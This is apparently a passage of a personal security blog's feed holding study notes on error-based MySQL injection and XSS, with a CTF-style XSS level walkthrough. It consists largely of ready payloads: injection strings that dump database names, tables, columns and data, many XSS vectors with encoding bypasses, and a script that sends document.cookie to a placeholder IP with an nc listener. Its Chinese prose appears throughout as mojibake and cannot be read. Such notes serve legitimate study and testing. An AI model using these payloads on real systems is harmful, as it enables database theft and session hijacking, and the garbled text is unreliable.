<p>å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)<br>æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</p>
</blockquote>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ±‚ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>pyloadï¼š<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥))))</code></p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>é’ˆå¯¹mysqlæ•°æ®åº“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŸ¥æ•°æ®åº“åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">çˆ†è¡¨åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">çˆ†å­—æ®µåï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">çˆ†æ•°æ®ï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼š</p>
<ul>
<li>â‘  0x7e=â€™~â€™</li>
<li>â‘¡ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€</li>
<li>â‘¢ version()=@@version</li>
<li>â‘£ â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦</li>
<li>â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</li>
</ul>
<p><strong>updatexml</strong></p>
<blockquote>
<p>å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)<br>æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p>
</blockquote>
<p>ç¬¬äºŒä¸ªå‚æ•°è·Ÿextractvalueå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œä¸”åˆ©ç”¨æ–¹å¼ç›¸åŒ<br>payloadï¼š<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥())),&quot;anything&quot;))</code></p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class="line">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>åŒæ ·ï¼Œé’ˆå¯¹mysqlï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“åï¼š&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">çˆ†è¡¨åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">çˆ†åˆ—åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">çˆ†æ•°æ®ï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>
<h3 id="concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤"><a href="#concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤" class="headerlink" title="concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤"></a>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</h3><p>è¿™ç§æŠ¥é”™æ–¹æ³•çš„æœ¬è´¨æ˜¯å› ä¸ºfloor(rand(0)*2)çš„é‡å¤æ€§ï¼Œå¯¼è‡´group byè¯­å¥å‡ºé”™ã€‚group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨çš„æ•°æ®ï¼›å¦‚æœkeyä¸åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚</p>
<p><strong>rand()ï¼š</strong></p>
<blockquote>
<p>ç”Ÿæˆ0~1ä¹‹é—´çš„éšæœºæ•°ï¼Œå¯ä»¥ç»™å®šä¸€ä¸ªéšæœºæ•°çš„ç§å­ï¼Œå¯¹äºæ¯ä¸€ä¸ªç»™å®šçš„ç§å­ï¼Œrand()å‡½æ•°éƒ½ä¼šäº§ç”Ÿä¸€ç³»åˆ—å¯ä»¥å¤ç°çš„æ•°å­—</p>
</blockquote>
<p><strong>floor()ï¼š</strong></p>
<blockquote>
<p>å¯¹ä»»æ„æ­£æˆ–è€…è´Ÿçš„åè¿›åˆ¶å€¼å‘ä¸‹å–æ•´</p>
</blockquote>
<p>é€šå¸¸åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ–¹æ³•æ˜¯<code>floor(rand(0))*2</code> ,å…¶ä¼šç”Ÿæˆ0å’Œ1ä¸¤ä¸ªæ•°</p>
<p><strong>group by</strong></p>
<blockquote>
<p>group byæ˜¯æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„çš„sqlè¯­å¥ï¼Œå…¶ç”¨æ³•ä¸ºï¼š<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p>
</blockquote>
<p>æŠ¥é”™çš„åŸå› æ˜¯å› ä¸º<strong>rand()å‡½æ•°åœ¨æŸ¥è¯¢çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡,æ’å…¥çš„æ—¶å€™è¿˜ä¼šæ‰§è¡Œä¸€æ¬¡.</strong>è¿™å°±æ˜¯æ•´ä¸ªè¯­å¥æŠ¥é”™çš„å…³é”®</p>
<p>å‰é¢è¯´è¿‡floor(rand(0)<em>2) å‰å…­ä½æ˜¯<em>*0110110</em></em></p>
<p><strong>group by xå…ˆå»ºç«‹ä¸€ä¸ªç©ºè¡¨,ç”¨äºåˆ†ç»„.</strong>ç„¶åè¿›è¡Œåˆ†ç»„æŸ¥è¯¢,ç¬¬ä¸€æ¬¡rand()æ‰§è¡Œ,æŸ¥è¯¢çš„ç»“æœæ˜¯0,å› ä¸ºæ˜¯ç©ºè¡¨æ‰€ä»¥æ’å…¥è¿™æ¡,è€Œæ’å…¥çš„æ—¶å€™rand()åˆæ‰§è¡Œäº†ä¸€æ¬¡,æ‰€ä»¥è¡¨ä¸­çš„ç»“æœå°±æ˜¯</p>
<p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png" alt="img"></a></p>
<p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ,æ¥ç€æ‰§è¡Œrand()çš„å€¼ä¸º1,å› ä¸ºè¡¨ä¸­å­˜åœ¨,æ‰€ä»¥åŠ 1,è¡¨ä¸­ç»“æœæˆä¸º</p>
<p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png" alt="img"></a></p>
<p>åˆ°äº†ç¬¬ä¸‰æ¬¡æ‰§è¡Œrand()æ˜¯å€¼ä¸º0,å› ä¸ºè¡¨ä¸­ä¸å­˜åœ¨æ‰€ä»¥è¦æ’å…¥æ–°çš„æ•°æ®,<strong>è¿™æ¬¡æ’å…¥rand()å†æ¬¡æ‰§è¡Œ,æ‰€ä»¥æ’å…¥çš„åˆæ˜¯1.è€Œè¡¨ä¸­å·²ç»å­˜åœ¨1äº†</strong></p>
<p><strong>æ­¤æ—¶æ’å…¥å› ä¸ºé‡å¤å‡ºç°åŒä¸€ä¸ªkey,å°±ä¼šå‡ºç°æŠ¥é”™ é‡å¤å‡ºç°key.è€ŒæŠ¥é”™ä¸­ä¼šè¯´æ˜é‚£ä¸ªkeyæœ‰é—®é¢˜,æˆ‘ä»¬çš„keyä¸­ç»“åˆäº†æƒ³è¦äº†è§£çš„å­—ç¬¦ä¸²root@localhost</strong></p>
<p><strong>è¿™æ ·å°±å®ç°äº†æŠ¥é”™æ³¨å…¥,æ‹¿åˆ°äº†è‡ªå·±æƒ³è¦çš„æ•°æ®</strong></p>
<p><strong><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png" alt="img"></a></strong></p>
<p>è¿™å°±æ˜¯æ•´ä¸ªæŠ¥é”™æ³¨å…¥çš„åŸç†äº†,rand(),floor() group by å‡½æ•°ç¼ºä¸€ä¸å¯.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€ä¸‹ctfhubæŠ¥é”™æ³¨å…¥</p>
<h3 id="ctfhubæŠ¥é”™æ³¨å…¥"><a href="#ctfhubæŠ¥é”™æ³¨å…¥" class="headerlink" title="ctfhubæŠ¥é”™æ³¨å…¥"></a>ctfhubæŠ¥é”™æ³¨å…¥</h3><p>æŸ¥è¡¨</p>
<p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png" alt="image-20200817145102761"></p>
<p>æŸ¥flag</p>
<p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png" alt="image-20200817145552296"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2020/12/09/xss/</url>
    <content><![CDATA[<p>è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"><a href="#ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š" class="headerlink" title="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"></a>ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š</h3><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªç½‘é¡µï¼Œhtmlå’Œphpï¼Œphpä¼šå»¶æ—¶æ‰§è¡Œã€‚</p>
<p>åŒæ­¥ï¼šåªæœ‰å½“phpæ‰§è¡Œå®Œä¹‹åï¼Œæ‰ä¼šæ˜¾ç¤ºhtmlç½‘é¡µã€‚</p>
<p>å¼‚æ­¥ï¼šåˆ·æ–°ä¹‹åï¼Œä¼šç«‹å³æ˜¾ç¤ºhtmlç½‘é¡µï¼Œä¹‹åå†æ˜¾ç¤ºphpæ‰§è¡Œçš„å†…å®¹ã€‚</p>
<h3 id="jsè®¾ç½®cookie"><a href="#jsè®¾ç½®cookie" class="headerlink" title="jsè®¾ç½®cookie"></a>jsè®¾ç½®cookie</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure>
<h2 id="0x01å­˜å‚¨xss"><a href="#0x01å­˜å‚¨xss" class="headerlink" title="0x01å­˜å‚¨xss"></a>0x01å­˜å‚¨xss</h2><p>å­˜å‚¨å‹xssä¸»è¦æ˜¯æ”»å‡»è€…å°†xssä»£ç æ’å…¥åˆ°é¡µé¢ä¸Šï¼Œç„¶åå­˜åœ¨æ•°æ®åº“é‡Œï¼Œå½“è®¿é—®è€…è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œå°±ä¼šå¯¼è‡´xssä»£ç æ‰§è¡Œã€‚</p>
<p>å‡ºç°åœºæ™¯ï¼šç¼–è¾‘å†…å®¹ï¼ˆxssä»£ç ï¼‰å¯ä»¥ä¿å­˜ï¼Œå¹¶ä¸”å¯ä»¥å†æ¬¡è®¿é—®è¿™ä¸ªå†…å®¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x02åå°„xss"><a href="#0x02åå°„xss" class="headerlink" title="0x02åå°„xss"></a>0x02åå°„xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼ŒæœåŠ¡å™¨å°†urlä¸­çš„xssä»£ç è¾“å…¥åˆ°é¡µé¢ä¸Šï¼Œæ”»å‡»è€…å°†xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»ã€‚</p>
<p>å‡ºç°åœºæ™¯ï¼šurlä¸­å¯ä»¥ä¼ é€’å‚æ•°</p>
<p>é€šå¸¸æ¥è¯´ï¼Œä¼šé—­åˆä¸€äº›æ ‡ç­¾ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚</p>
<p>å¸¸ç”¨é—­åˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶å®è¿˜æ˜¯å…·ä½“æƒ…å†µå…·ä½“å¯¹å¾…</p>
<h2 id="0x03domå‹xss"><a href="#0x03domå‹xss" class="headerlink" title="0x03domå‹xss"></a>0x03domå‹xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä»urlä¸­è·å–xssä»£ç å¹¶ä¸”è¾“å…¥åˆ°é¡µé¢ï¼Œå¯¼è‡´xssä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»</p>
<p>å…³äºåå°„å‹å’Œdomå‹å·®åˆ«ï¼š</p>
<p>å‰ç«¯å¤„ç†æ˜¯domï¼Œåç«¯å¤„ç†æ˜¯åå°„</p>
<h1 id="å¸¸ç”¨ä¿®å¤å‡½æ•°"><a href="#å¸¸ç”¨ä¿®å¤å‡½æ•°" class="headerlink" title="å¸¸ç”¨ä¿®å¤å‡½æ•°"></a>å¸¸ç”¨ä¿®å¤å‡½æ•°</h1><p>strip_tagsï¼šè¿‡æ»¤htmlæ ‡ç­¾</p>
<p>htmlspecialcharsï¼šå°†htmlæ ‡ç­¾è½¬æ¢ä¸ºå®ä½“</p>
<h1 id="å¸¸ç”¨çš„payload"><a href="#å¸¸ç”¨çš„payload" class="headerlink" title="å¸¸ç”¨çš„payload"></a>å¸¸ç”¨çš„payload</h1><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">éœ€è¦ç”¨ç¼–ç ç»•è¿‡æ—¶ï¼š</span><br><span class="line">Base64ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencodeï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTMLå®ä½“ç¼–ç  ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Cookieç›—å–ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">ncç›‘å¬ç«¯å£1234</span><br></pre></td></tr></table></figure>
<h1 id="xssç¼–ç "><a href="#xssç¼–ç " class="headerlink" title="xssç¼–ç "></a>xssç¼–ç </h1><h2 id="jsç¼–ç "><a href="#jsç¼–ç " class="headerlink" title="jsç¼–ç "></a>jsç¼–ç </h2><p>JSæä¾›äº†å››ç§å­—ç¬¦ç¼–ç çš„ç­–ç•¥ï¼Œ</p>
<ul>
<li>ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\141</code></li>
<li>ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\x61</code></li>
<li>å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\u0061</code></li>
<li>å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼Œå¦‚<code>\n</code>å’Œ<code>\r</code></li>
</ul>
<h2 id="HTMLå®ä½“ç¼–ç "><a href="#HTMLå®ä½“ç¼–ç " class="headerlink" title="HTMLå®ä½“ç¼–ç "></a>HTMLå®ä½“ç¼–ç </h2><p><strong>å‘½åå®ä½“</strong><br>ä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚<code>&lt;</code>çš„ç¼–ç ä¸º<code>&amp;1t;</code></p>
<p><strong>å­—ç¬¦ç¼–ç </strong></p>
<p>åè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶çš„ASCIIç æˆ–è€…Unicodeå­—ç¬¦ç¼–ç ã€‚æ ·å¼ä¸º<code>&amp;#</code>æ•°å€¼;</p>
<p>å¦‚<code>&lt;</code>çš„ç¼–ç ä¸º</p>
<p><code>&lt;</code>(10è¿›åˆ¶)&amp;#60</p>
<p><code>&lt;</code>(16è¿›åˆ¶)&amp;#x003c</p>
<p><strong>URLç¼–ç </strong></p>
<p>è¿™é‡Œä¸ºurlå…¨ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ä¸¤æ¬¡urlç¼–ç </p>
<p>å¦‚alertçš„urlå…¨ç¼–ç <code>ä¸º%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
<p><strong>String.fromCharCodeç¼–ç </strong></p>
<p>å¦‚alertçš„ç¼–ç ä¸º<code>String.fromCharCode(97,108,101,114,116)</code></p>
<h1 id="xssæŒ‘æˆ˜é¢˜"><a href="#xssæŒ‘æˆ˜é¢˜" class="headerlink" title="xssæŒ‘æˆ˜é¢˜"></a>xssæŒ‘æˆ˜é¢˜</h1><p>åšä»»ä½•é¢˜éƒ½å¯ä»¥æµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure>
<p>åšä¸€ä¸‹xssé¢˜</p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p>
<p>å¯ä»¥å‘ç°teståœ¨h2æ ‡ç­¾å¤„ï¼Œç›´æ¥å†™å°±å¯ä»¥åªéœ€è¦å¼¹çª—ï¼Œå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€å…³</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p>
<p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p>
<p>å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œå€¼ç›´æ¥åœ¨valueå¤„ï¼Œæ‰€ä»¥<strong>åªéœ€è¦é—­åˆæ ‡ç­¾å³å¯</strong></p>
<p><strong>æœç´¢æ¡†é‡Œç›´æ¥å†™</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶è¿˜æœ‰å…¶ä»–æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">éœ€è¦ç‚¹å‡»æœç´¢æ¡†</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>
